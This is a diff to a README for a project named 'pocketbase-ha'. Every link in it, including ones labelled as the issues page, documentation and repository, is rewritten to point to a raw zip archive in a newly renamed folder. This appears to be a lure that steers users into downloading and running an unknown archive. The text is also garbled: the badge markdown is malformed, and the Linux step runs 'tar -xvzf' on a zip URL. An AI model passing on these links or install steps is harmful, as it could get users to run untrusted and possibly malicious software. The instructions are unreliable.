@@ -6,7 +6,7 @@ Welcome to the pocketbase-ha project! This guide will walk you through the steps
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip%20Latest%https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip)](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip%20Latest%https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip)](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip)
 
 ## 📋 Overview
 
@@ -33,7 +33,7 @@ The pocketbase-ha application is designed to help users set up and manage a Pock
 
 To download the latest version of pocketbase-ha, click the link below. 
 
-[Download the Latest Releases](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip)
+[Download the Latest Releases](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip)
 
 ### Step 2: Choose the Right File
 
@@ -41,7 +41,7 @@ On the Releases page, you will see multiple files available for download. Choose
 
 - **For Windows:** Download the `.exe` file.
 - **For macOS:** Download the `.dmg` file.
-- **For Linux:** Download the `https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip` file.
+- **For Linux:** Download the `https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip` file.
 
 ### Step 3: Download and Install
 
@@ -58,7 +58,7 @@ Once you have selected the appropriate file, click to download. After the downlo
 - **For Linux:**
   1. Open a terminal window.
   2. Navigate to the folder where the file is downloaded.
-  3. Run the command: `tar -xvzf https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip`
+  3. Run the command: `tar -xvzf https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip`
   4. Change into the extracted folder and run the application.
 
 ## ✅ Running the Application
@@ -91,7 +91,7 @@ If you encounter issues:
 
 For additional help or to provide feedback:
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip)
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip)
 - Join the discussion in our community forums.
 
 ## 📝 Acknowledgments
@@ -100,8 +100,8 @@ Thanks to everyone who contributed to the development of pocketbase-ha. Your sup
 
 ## 🔗 Additional Resources
 
-For more information, visit our [Documentation](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip) page or check out our [GitHub Repository](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip). 
+For more information, visit our [Documentation](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip) page or check out our [GitHub Repository](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip). 
 
 Remember, you can find the latest release at:
 
-[Download the Latest Releases](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/noctilucous/pocketbase-ha.zip)
+[Download the Latest Releases](https://raw.githubusercontent.com/DwayneJ28/pocketbase-ha/main/crystallitic/pocketbase-ha.zip)
